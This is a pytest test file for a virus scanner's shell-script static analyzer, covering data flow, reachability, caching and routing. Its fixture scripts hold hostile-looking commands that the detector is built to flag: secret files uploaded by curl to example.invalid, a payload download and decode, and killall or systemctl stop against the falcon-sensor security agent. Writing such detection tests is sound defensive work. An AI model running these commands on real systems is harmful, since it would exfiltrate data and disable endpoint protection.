"""Phase 23 bounded POSIX-shell frontend regressions."""
from __future__ import annotations

from contextlib import contextmanager
import json
import os
from pathlib import Path

import pytest

from Virus_Scan.contracts.artifact_read_snapshot import build_artifact_read_snapshot
from Virus_Scan.routing.extension_outcome import route_identity_record
from Virus_Scan.routing.extension_scan_router import scan_file_by_type
from Virus_Scan.tests.support.scan_session_fixtures import scan_session_snapshot_fixture
from Virus_Scan.scanners.static_program_analysis import (
    SHELL_FRONTEND_DIGEST,
    SHELL_FRONTEND_SCHEMA_VERSION,
    SHELL_MAX_SOURCE_BYTES,
    STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION,
    STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID,
    STATIC_PROGRAM_ANALYSIS_FRONTENDS,
    analyze_shell_snapshot,
    shell_analysis_dependency_digest,
)
from Virus_Scan.storage import scan_cache_repository, sqlite_lifecycle


@contextmanager
def _isolated_runtime(tmp_path: Path):
    previous = os.environ.get("UMIGE_BASE_DIR")
    sqlite_lifecycle().close()
    runtime_root = tmp_path / "runtime"
    os.environ["UMIGE_BASE_DIR"] = str(runtime_root)
    try:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=True)
        yield runtime_root
    finally:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=False)
        sqlite_lifecycle().close()
        if previous is None:
            os.environ.pop("UMIGE_BASE_DIR", None)
        else:
            os.environ["UMIGE_BASE_DIR"] = previous


def _analysis(path: Path):
    return analyze_shell_snapshot(build_artifact_read_snapshot(path)).analysis


def _by_kind(analysis):
    return {
        kind: tuple(operation for operation in analysis.operations if operation.operation_kind == kind)
        for kind in {operation.operation_kind for operation in analysis.operations}
    }


def test_phase23_shell_registry_has_one_frontend_owner() -> None:
    expected = (
        "javascript_typescript_static_analysis",
        "powershell_static_analysis",
        "batch_cmd_static_analysis",
        "shell_static_analysis",
        "dotnet_il_static_analysis",
        "native_elf_x86_64_static_analysis",
        "python_renpy_static_analysis",
    )
    assert tuple(item.scanner_id for item in STATIC_PROGRAM_ANALYSIS_FRONTENDS) == expected
    frontend = STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID["shell_static_analysis"]
    assert STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION[".sh"] is frontend
    assert frontend.frontend_digest == SHELL_FRONTEND_DIGEST
    assert frontend.schema_version == SHELL_FRONTEND_SCHEMA_VERSION


def test_phase23_shell_comments_and_echo_documentation_do_not_mint_operations(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "documentation.sh"
        target.write_text(
            "#!/bin/sh\n"
            "# curl --data secret https://example.invalid\n"
            "printf '%s\\n' 'killall falcon-sensor'\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        assert analysis.parser_status == "complete"
        assert analysis.operations == ()
        assert analysis.flow_edges == ()


def test_phase23_shell_command_substitution_to_network_sink_has_exact_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "flow.sh"
        target.write_text(
            "#!/bin/sh\n"
            "data=$(cat secret.txt)\n"
            "curl --data \"$data\" https://example.invalid/upload\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        kinds = _by_kind(analysis)
        source = kinds["file_read"][0]
        sink = kinds["network_send"][0]
        upload = kinds["network_upload"][0]
        assert source.flow_identity.startswith("flow_")
        assert sink.flow_identity == source.flow_identity
        assert upload.flow_identity == source.flow_identity
        assert any(edge.edge_kind == "assignment" for edge in analysis.flow_edges)
        flow_targets = {
            edge.target_operation_id for edge in analysis.flow_edges
            if edge.edge_kind == "source_to_sink"
        }
        assert sink.operation_id in flow_targets
        assert upload.operation_id in flow_targets


def test_phase23_shell_pipeline_to_network_sink_has_exact_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "pipeline.sh"
        target.write_text(
            "cat secret.txt | curl --data-binary @- https://example.invalid/upload\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        source = _by_kind(analysis)["file_read"][0]
        kinds = _by_kind(analysis)
        sink = kinds["network_send"][0]
        upload = kinds["network_upload"][0]
        assert sink.flow_identity == source.flow_identity
        assert upload.flow_identity == source.flow_identity
        flow_targets = {
            edge.target_operation_id for edge in analysis.flow_edges
            if edge.edge_kind == "source_to_sink"
        }
        assert sink.operation_id in flow_targets
        assert upload.operation_id in flow_targets


def test_phase23_shell_multiple_sources_abstain_from_single_sink_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "ambiguous.sh"
        target.write_text(
            "left=$(cat left.txt)\nright=$(cat right.txt)\n"
            "curl --data \"$left$right\" https://example.invalid/upload\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        sink = _by_kind(analysis)["network_send"][0]
        assert sink.flow_identity == ""
        assert sink.resolution_state == "partial"
        assert "ambiguous_source_flow" in sink.limitations
        assert not any(edge.edge_kind == "source_to_sink" and edge.target_operation_id == sink.operation_id for edge in analysis.flow_edges)


def test_phase23_shell_function_and_constant_branch_reachability_are_structural(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "reachability.sh"
        target.write_text(
            "called() {\n  python3 called.py\n}\n"
            "dormant() {\n  python3 dormant.py\n}\n"
            "called\n"
            "if false; then\n  killall falcon-sensor\nfi\n",
            encoding="utf-8",
        )
        kinds = _by_kind(_analysis(target))
        launches = {
            tuple(operation.resolved_arguments["arguments"])[-1]: operation
            for operation in kinds["process_launch"]
            if operation.resolved_arguments.get("command") == "python3"
        }
        assert launches["called.py"].reachability_state == "entrypoint_reachable"
        assert launches["dormant.py"].reachability_state == "locally_reachable"
        assert kinds["security_process_terminate"][0].reachability_state == "unreachable"


def test_phase23_shell_dynamic_eval_source_and_command_names_abstain(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "dynamic.sh"
        target.write_text(
            "runner=python3\n$runner script.py\neval 'curl https://example.invalid'\nsource other.sh\n",
            encoding="utf-8",
        )
        analysis = _analysis(target)
        assert analysis.operations == ()
        assert "dynamic_command_name" in analysis.unresolved_constructs
        assert "dynamic_shell_evaluation:eval" in analysis.unresolved_constructs
        assert "dynamic_shell_evaluation:source" in analysis.unresolved_constructs


def test_phase23_shell_copy_decode_download_and_redirection_preserve_direction(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "directions.sh"
        target.write_text(
            "curl -o payload.bin https://example.invalid/payload\n"
            "base64 --decode encoded.txt > decoded.bin\n"
            "cp decoded.bin final.bin\n",
            encoding="utf-8",
        )
        kinds = _by_kind(_analysis(target))
        assert kinds["network_download"]
        assert kinds["decode"]
        assert len(kinds["file_read"]) >= 2
        assert len(kinds["file_write"]) >= 3
        assert any(edge.edge_kind == "source_to_sink" for edge in _analysis(target).flow_edges)


def test_phase23_shell_security_targets_are_exact_not_generic(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "security.sh"
        target.write_text(
            "killall sleep\nkillall falcon-sensor\n"
            "systemctl stop cron\nsystemctl stop falcon-sensor\n",
            encoding="utf-8",
        )
        kinds = _by_kind(_analysis(target))
        assert len(kinds["security_process_terminate"]) == 1
        assert len(kinds["security_service_stop"]) == 1
        assert len(kinds["process_launch"]) == 4


def test_phase23_shell_cache_is_exact_and_failed_results_are_not_reused(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        good = tmp_path / "good.sh"
        good.write_text("python3 safe.py\n", encoding="utf-8")
        snapshot = build_artifact_read_snapshot(good)
        first = analyze_shell_snapshot(snapshot)
        second = analyze_shell_snapshot(snapshot)
        assert first.cache_source == "computed"
        assert second.cache_source == "sqlite_cache"
        assert first.analysis.semantic_digest == second.analysis.semantic_digest
        assert first.analysis.parser_digest == SHELL_FRONTEND_DIGEST

        bad = tmp_path / "bad.sh"
        bad.write_text("echo 'unterminated\n", encoding="utf-8")
        bad_snapshot = build_artifact_read_snapshot(bad)
        first_bad = analyze_shell_snapshot(bad_snapshot)
        second_bad = analyze_shell_snapshot(bad_snapshot)
        assert first_bad.analysis.parser_status == "failed"
        assert first_bad.cache_source == "computed"
        assert second_bad.cache_source == "computed"
        assert scan_cache_repository().get_static_analysis(
            content_sha256=bad_snapshot.content_sha256,
            analysis_dependency_digest=shell_analysis_dependency_digest(),
        ) is None


def test_phase23_shell_utf8_utf16_and_size_bounds_fail_closed(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        utf8 = tmp_path / "utf8.sh"
        utf8.write_text("printf 'café\\n'\n", encoding="utf-8")
        assert _analysis(utf8).parser_status == "complete"

        utf16 = tmp_path / "utf16.sh"
        utf16.write_bytes("python3 safe.py\n".encode("utf-16"))
        assert _analysis(utf16).parser_status == "complete"

        large = tmp_path / "large.sh"
        large.write_bytes(b"x" * (SHELL_MAX_SOURCE_BYTES + 1))
        analysis = _analysis(large)
        assert analysis.parser_status == "truncated"
        assert analysis.integrity_status == "partial"
        assert "source_size_limit_exceeded" in analysis.limitations


def test_phase23_shell_router_preserves_static_scope_and_fallback(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "route.sh"
        target.write_text("data=$(cat secret.txt)\ncurl --data \"$data\" https://example.invalid/upload\n", encoding="utf-8")
        outcome = scan_file_by_type(str(target), scan_session_snapshot=scan_session_snapshot_fixture(), artifact_read_snapshot=build_artifact_read_snapshot(target))
        identity = route_identity_record(outcome.identity)
        assert identity is not None
        summary = identity["static_program_analysis"]
        assert summary["scanner_id"] == "shell_static_analysis"
        assert summary["parser_status"] == "complete"
        decisions = {item["scanner_id"]: item for item in identity["scanner_execution_plan"]["decisions"]}
        assert decisions["shell_static_analysis"]["outcome_status"] == "complete_with_observation"
        assert decisions["batch_cmd_static_analysis"]["outcome_status"] == "not_applicable"
        assert decisions["powershell_static_analysis"]["outcome_status"] == "not_applicable"
        records = tuple(record for record in outcome.tag_evidence.records if record.source_detector == "shell_static_analysis")
        assert records
        assert all(record.modality == "static_control_flow" for record in records)

        malformed = tmp_path / "malformed.sh"
        malformed.write_text("curl https://example.invalid 'unterminated\n", encoding="utf-8")
        malformed_outcome = scan_file_by_type(str(malformed), scan_session_snapshot=scan_session_snapshot_fixture(), artifact_read_snapshot=build_artifact_read_snapshot(malformed))
        malformed_identity = route_identity_record(malformed_outcome.identity)
        assert malformed_identity is not None
        assert malformed_identity["static_program_analysis"]["parser_status"] == "failed"
        assert malformed_outcome.tags


def test_phase23_shell_physical_records_contain_no_attack_or_probability_authority(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "scope.sh"
        target.write_text("killall falcon-sensor\n", encoding="utf-8")
        text = json.dumps(_analysis(target).to_record(), sort_keys=True).casefold()
        assert "attack_technique" not in text
        assert "p_mitre" not in text
        assert "runtime_occurrence" not in text
        assert "execution_observed" not in text
